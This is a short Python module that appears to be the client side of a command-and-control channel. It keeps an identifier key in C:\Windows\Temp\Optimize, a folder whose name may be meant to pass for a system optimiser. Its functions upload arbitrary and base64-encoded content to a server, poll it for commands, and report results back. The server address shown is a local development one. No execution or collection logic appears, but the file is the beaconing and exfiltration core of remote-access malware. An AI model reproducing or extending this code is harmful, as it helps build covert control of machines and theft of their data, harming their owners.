import requests
import os
import base64
URL = "http://127.0.0.1:5000"

if not os.path.exists(r"C:\Windows\Temp\Optimize\key.txt"):
    key = requests.get(URL + "/generate-code").content
    with open(r"C:\Windows\Temp\Optimize\key.txt", "wb") as file:
        file.write(key)
def get_key():
    if not os.path.exists(r"C:\Windows\Temp\Optimize\key.txt"):
        key = requests.get(URL + "/generate-code").content
        print(key)
        with open(r"C:\Windows\Temp\Optimize\key.txt", "wb") as file:
            file.write(key)
    else:
        with open(r"C:\Windows\Temp\Optimize\key.txt", "rb") as file:
            key = file.read()
    return base64.b64encode(key).decode("utf-8")

def sendall(content):
    key = get_key()
    payload = {
        "content": content,
        "key": key
    }
    requests.post(URL + "/send-content", json=payload)
def senda(content):
    encoded = base64.b64encode(content).decode("utf-8")
    key = get_key()
    payload = {
        "content": encoded,
        "key":key
    }

    requests.post(URL + f"/upload/", json=payload)
def recv():
    key = get_key()
    response = requests.get(URL + f"/get-commands/{key}")
    if response.ok:
        return response.json()
    return None
def update(data):
    key = get_key()
    payload = {
        "commands": str(data),
        "key": key
    }
    requests.post(URL + "/update", json=payload)